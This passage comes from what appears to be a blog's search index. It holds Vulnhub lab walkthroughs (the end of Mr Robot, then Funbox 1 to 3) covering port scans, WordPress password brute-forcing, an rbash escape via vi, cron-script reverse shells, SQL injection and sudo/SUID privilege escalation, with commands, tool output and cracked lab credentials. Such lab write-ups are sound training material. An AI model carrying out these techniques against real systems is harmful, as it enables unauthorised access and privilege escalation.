/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper /usr/lib/pt_chown   I ran nmap in interactive mode and successfully received the shell with root privileges.     ","categories": ["TJ-Null-OSCP"],
        "tags": [],
        "url": "/tj-null-oscp/vulnhub-mr-robot-1-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub Funbox 1 Walkthrough",
        "excerpt":"I personally found this box quite interesting. To gain the initial foothold, I ran WPScan with a password list, using rockyou.txt which led to the discovery of two valid user credentials for the web console. One of these users also had SSH access to the box. However, obtaining the shell wasn’t enough; there was an additional step to escape the rbash shell. For root access, post-enumeration was crucial, as there were multiple ways to achieve it. Some methods were relatively straightforward, while others required additional research.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT      STATE SERVICE VERSION 21/tcp    open  ftp     ProFTPD 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 (RSA) |   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 (ECDSA) |_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd (ED25519) 80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Did not follow redirect to http://funbox.fritz.box/ | http-robots.txt: 1 disallowed entry  |_/secret/ |_http-server-header: Apache/2.4.41 (Ubuntu) 33060/tcp open  mysqlx? | fingerprint-strings:  |   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:  |     Invalid message\" |_    HY000   From the Nmap results, we found that four ports are publicly accessible: 21 (FTP), 22 (SSH), 80 (HTTP), and 33060 (MySQL). The SSH and HTTP banners confirm that the operating system is Ubuntu. Additionally, the HTTP service redirects to a domain named ‘funbox.fritz.box’. Let’s add this to our hosts file first.   echo \"10.10.10.5 funbox.fritz.box\" | sudo tee -a /etc/hosts   Since we don’t have any valid credentials, we couldn’t access the SSH or MySQL servers. Therefore, I would like to proceed through the web server.   Manual Inspection      This is a WordPress application, and I haven’t discovered any interactive elements on the web server, such as input boxes or dynamic pagination, except for the WordPress technology itself. Nmap also revealed a ‘Disallow’ entry in the robots.txt file; let’s check it out.      The URL only displays a message: ‘No secrets here. Try harder!’ Since this is a WordPress web application, I plan to run WPScan. However, considering the lack of substantial content during enumeration, generating a word-list based on this application seems unlikely to be fruitful. Instead, I’ll opt to run the rockyou.txt file for password brute-force attacks.   wpscan --url http://funbox.fritz.box/ --enumerate --passwords /usr/share/wordlists/rockyou.txt  [+] URL: http://funbox.fritz.box/ [10.10.10.5] [+] Started: Sat Nov 11 23:33:29 2023  Interesting Finding(s):  [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).   [+] WordPress theme in use: twentyseventeen   [i] No plugins Found.  [i] No Timthumbs Found.  [i] No Config Backups Found.  [i] No DB Exports Found.  [i] No Medias Found.  [i] User(s) Identified:  [+] admin   [+] joe  [+] Performing password attack on Wp Login against 2 user/s [SUCCESS] - joe / 12345                                                                                                                                         [SUCCESS] - admin / iubire                                                                                                                                      Trying admin / iubire Time: 00:00:09 &lt;                                                                                 &gt; (670 / 28689453)  0.00%  ETA: ??:??:??  [!] Valid Combinations Found:  | Username: joe, Password: 12345  | Username: admin, Password: iubire   WPScan revealed two valid user credential combinations. I tested both sets of credentials in the web console, and both were successful. Before proceeding with further enumeration on the web console, I plan to verify these credentials for both FTP and SSH access.      During the login attempt for FTP, the credentials for the ‘joe’ user worked successfully. However, the credentials for the ‘admin’ user did not grant access to the FTP service. Using the ‘joe’ user account, we discovered an mbox file and downloaded it to our local machine.      The mbox file appears to be a mail file, and within it, we discovered some interesting messages. One message mentioned ‘funny’ as a possible username, and there was also a reference to a backup script, suggesting the existence of a script for backing up certain items. Additionally, there’s a warning message for Joe to change his password, with ‘12345’ being recommended. However, we already know Joe’s password. Let’s attempt to SSH using the credentials for both Joe and Admin.      Creds    💡 joe:12345 admin:iubire    Initial Foothold   The SSH login attempt with the ‘admin’ user was unsuccessful; however, the credentials for ‘joe’ were valid, providing me with the initial foothold for this box.      Post Enumeration &amp; Privilege Escalation   After gaining the initial foothold, I discovered that the default shell is rbash, the restricted bash shell for Joe. To progress further, we need to find a way to escape this restricted shell.      Numerous techniques exist for escaping a jailed shell, but I opted for the vi editor technique. I executed the following commands, successfully escaping the restricted rbash shell.   vi :set shell=/bin/bash :shell   After successfully escaping the rbash, I searched for the backup script and located a file owned by the ‘funny’ user. Interestingly, the file is readable, writable, and executable for everyone. Although I checked for a cronjob for the ‘joe’ user and found none, since the file is owned by the ‘funny’ user, I assume it is executed by the cron job of the ‘funny’ user.      To confirm the existence of the cron job, I transferred pspy to the victim machine and executed it to monitor all input and output operations. After a few moments, I observed a cron job running periodically, executed by both the root and funny users.      Since I have write access, I modified the file and added a reverse shell code. I then started a listener on my Kali machine to capture the reverse shell.      After few moment i got the reverse shell as user funny.      Both the root and funny users have a cronjob to run this file, providing us with a reverse shell if executed. At this point, by removing the cronjob for funny, only the root user will execute the file, allowing us to gain root access. So, I went ahead and removed the cronjob for funny.      i Just modify the file once again to change the port and start a new listener for root. Within a few moment i got the reverse connection as root.      Bonus   While enumerating as the ‘funny’ user, I noticed that this user is also a member of the ‘lxd’ group. This discovery is quite interesting. After some research, I found a publicly available privilege escalation exploit for this scenario. We could proceed with it.      I searched in the searchsploit database and found one result with a Bash script. However, there are some prerequisites for this attack to work—specifically, the lxd and lxc components need to be installed on the machine.      The binaries are available inside the machine.      Although both binaries are present inside the box, I’ve decided not to pursue them since I already have root access. Skipping the ‘funny’ user’s part, with a bit of luck, we might catch the root reverse-shell on the first attempt. There are multiple ways to achieve root on this machine. I thoroughly enjoyed working on this machine.  ","categories": ["Funbox-Series"],
        "tags": [],
        "url": "/funbox-series/vulnhub-fun-box-1-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub Funbox 2 Walkthrough",
        "excerpt":"This box is very straightforward; there is nothing complex that we need to know about some tools. From the FTP, we obtained numerous zip files encrypted with passwords. We decrypted one user’s files password and found ‘id_rsa’ inside the zip, allowing SSH login into the box. To escalate privileges, we need to find out the users’ passwords, which are stored inside a history file.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT   STATE SERVICE VERSION 21/tcp open  ftp     ProFTPD 1.3.5e | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip | -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip | -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg |_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA) |   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA) |_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) | http-robots.txt: 1 disallowed entry  |_/logs/ |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel   From the Nmap output, we found three open ports. The first one is FTP, where anonymous login is allowed, and Nmap lists numerous zip files. The second and third ports are SSH and HTTP, respectively. The HTTP port displays a default Apache installation page. Let’s start enumerating one by one.   Manual Inspection   We already observed the anonymous login for FTP, and there are numerous files present. However, before we deep dive into that, I would like to run some backend reconnaissance. So, I will start from port 80 now.   Port 80      This is just the default Apache2 installation page; I did not find anything here. I would like to run fuzzing to find out if there are any interesting files or directories present.   Fuzzing Directories   wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \"$URL\"  ===================================================================== ID           Response   Lines    Word       Chars       Payload                                                                                       ===================================================================== 000004227:   403        9 L      28 W       275 Ch      \"server-status\"                                                                               000004255:   200        375 L    964 W      10918 Ch    \"http://10.10.10.8/\"    Fuzzing Files   wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"$URL\"  ===================================================================== ID           Response   Lines    Word       Chars       Payload                                                                                       ===================================================================== 000000069:   200        375 L    964 W      10918 Ch    \"index.html\"                                                                                  000000157:   403        9 L      28 W       275 Ch      \".htaccess\"                                                                                   000000248:   200        1 L      2 W        17 Ch       \"robots.txt\"                                                                                  000000379:   200        375 L    964 W      10918 Ch    \".\"                                                                                           000000537:   403        9 L      28 W       275 Ch      \".html\"                                                                                       000000806:   403        9 L      28 W       275 Ch      \".php\"                                                                                        000001564:   403        9 L      28 W       275 Ch      \".htpasswd\"                                                                                   000001830:   403        9 L      28 W       275 Ch      \".htm\"                                                                                                     I didn’t find anything interesting; it seems they have only installed the Apache2 service, and no application is hosted there.   Port 21      I have successfully logged in as an anonymous user through FTP, and there are many files present here.         I have downloaded all the files to my local machine to analyze them. There were two hidden files, and I just renamed the files to make them visible.      The ‘users’ file and ‘admin’ file had the same content. However, the content of the ‘admin’ file was base64 encrypted, while the ‘users’ file’s content was in plain text format. Inside the content, they provided an idea about the zipped file data, and the password for the zip file was the old password. Currently, we don’t have any information about this password.   I used the Zip2John tool to create a file compatible with John the Ripper and started brute-forcing using the rockyou.txt file. Within a moment, I obtained the password for the ‘tom.zip’ file.      Using the password, I successfully decrypted the file, and it’s an ‘id_rsa’ file. Now, with the ‘id_rsa’ file in hand and the SSH port open, we can utilize the SSH port to gain a real shell on this box.      Initial Foothold      As I obtained the ‘id_rsa’ file, I used this private key instead of the user’s password. So, I passed the file and successfully logged into the machine.   Post Enumeration &amp; Privilege Escalation      I performed the ‘ls -la’ command to check the content present in the current directory. Here, I found a MySQL history file and a ‘sudo_as_admin_successful’ file. The ‘sudo_as_admin_successful’ file is an indication of the user’s sudo permission existence. Maybe it doesn’t have full sudo permissions, but at least it has the minimal amount. I performed ‘sudo -l’ to find out the permissions, but it asked for the password of this user. To find another way to get root or the ‘tom’ user’s password, I tried to open the ‘mysql_history’ file and encountered an error related to ‘rbash’.      Rbash is a restricted bash environment where the user only gets some limited permissions. However, rbash is not very reliable because there are lots of techniques and tricks already available to escape rbash. In this scenario, I would like to go for the vi editor escaping technique.   vi :set shell=/bin/bash :shell   It works every time. Now we can see the mysql_history file.      inside the file i found a insert command where tom and a strings is visible so i just tried the strings a the password and it worked.      We can see that the ‘tom’ user has full sudo permission on this box, and now that we have the user’s password, we can simply switch the user to root, and we are now root.     ","categories": ["Funbox-Series"],
        "tags": [],
        "url": "/funbox-series/vulnhub-fun-box-2-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub Funbox 3 Walkthrough",
        "excerpt":"This box was quite interesting to me. I found lots of rabbit holes here. Initially, we discovered three applications. The admin application was vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication, but I could not find any way to access the box from there. In the gym application, I did not find anything exploitable. However, the store application was also vulnerable to SQLi, and we successfully dumped the admin credentials and logged into the application.   The file upload vulnerability was not working for me, so I searched for publicly available exploits and found a Remote Code Execution (RCE) vulnerability. Using the RCE, I obtained credentials for SSH, which led to the initial foothold. Privilege escalation was very straightforward, involving the misuse of permissions. However, we can also obtain root access using the SUID binary.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT      STATE SERVICE VERSION 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA) |   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA) |_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519) 80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works | http-robots.txt: 1 disallowed entry  |_gym |_http-server-header: Apache/2.4.41 (Ubuntu) 33060/tcp open  mysqlx? | fingerprint-strings:  |   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:  |     Invalid message\" |_    HY000   From the Nmap output, we found three open ports. The first one is SSH, and the second and third are web server and MySQL server, respectively. Both service banners confirmed that this is an Ubuntu machine. We can see a message from the web server; it’s a default page, and there is one disallowed entry available. Before we move on, I would like to run a directory brute force on it.   gobuster dir -u http://10.10.10.11/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt   =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url:                     http://10.10.10.11/ [+] Method:                  GET [+] Threads:                 10 [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt [+] Negative Status codes:   404 [+] User Agent:              gobuster/3.6 [+] Timeout:                 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /admin                (Status: 301) [Size: 310] [--&gt; http://10.10.10.11/admin/] /store                (Status: 301) [Size: 310] [--&gt; http://10.10.10.11/store/] /secret               (Status: 301) [Size: 311] [--&gt; http://10.10.10.11/secret/] /server-status        (Status: 403) [Size: 276] Progress: 23186 / 62285 (37.23%)[ERROR] parse \"http://10.10.10.11/error\\x1f_log\": net/url: invalid control character in URL /gym                  (Status: 301) [Size: 308] [--&gt; http://10.10.10.11/gym/] Progress: 62284 / 62285 (100.00%) =============================================================== Finished ===============================================================   From the directory fuzzing, we found three more interesting directories: admin, store, and secret. Let’s manually inspect each directory one by one.      From the secret i did not found anything interesting. From the admin i found the login page and i tried the basic authentication bypass SQLi payload here.      The login panel is vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication. However, after spending a good amount of time, I understand that there is no way to obtain a shell, maybe this is a rabbit hole.      I moved on to the gym application and found nothing interesting here as well. I didn’t want to invest a lot of time here, so I decided to move on to the store application.      In the store application, I found lots of books present, and the title is ‘CSE Bookstore.’ I also noticed that this application is powered by ProjectWorld. I will look for publicly available exploits.      First, I clicked on a book image and added a single quote at the end of the URL to generate a SQL syntax error, checking if the application is vulnerable to SQL injection. It did indeed generate the error.      So, I ran SQLmap and dumped the admin password from the admin table.      I logged in as an admin, and there is a feature for adding a book where we can upload PHP files as well. Unfortunately, I could not add any books; there was a SQL error for me. So, I searched for publicly available exploits and found this remote code execution exploit on ExploitDB.      i just search through the terminal and download it to my current folder.      Initial foothold      By running the payload, I got the Remote Code Execution (RCE). However, this shell is not a reverse shell; it’s just a remote code execution. So, I was poking around with the file system inside the home directory. We found a user, and inside the user’s directory, we found a password file.      As the SSH port is open and the SSH password is mentioned, we can SSH into the box using these credentials. And now, we are in.      Post Enumeration &amp; Privilege Escalation      First, I checked the sudo permissions and found the ‘time’ binary here, which seems exotic to me. So, I searched in GTFOBins and found two privilege escalation techniques using sudo and the SUID method.      i just tried the sudo technique and it works.      When I ran the ‘id’ command, I found that this user is also a member of the ‘lxd’ group. The ‘lxd’ group has a publicly available exploit, but the prerequisite is that we need to run the ‘lxd’ and ‘lxc’ binaries. So, I tried to run them to check if they are present or not, but I received a ‘permission denied’ error.      I was curious enough, so I tried to find the SUID binaries and found ‘time’ here as well.   find / -perm -u=s -type f 2&gt;/dev/null  /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/bin/umount /usr/bin/sudo /usr/bin/time /usr/bin/chfn /usr/bin/mount /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/pkexec /usr/bin/passwd /usr/bin/su /usr/bin/at /usr/bin/chsh /usr/bin/fusermount   And this technique also worked. The ‘id’ command shows that I am still Tony; however, the effective UID is root, so I can perform every task as root.     ","categories": ["Funbox-Series"],
        "tags": [],
        "url": "/funbox-series/vulnhub-Fun-Box-3-walkthrough/",
        "teaser": null
      }]
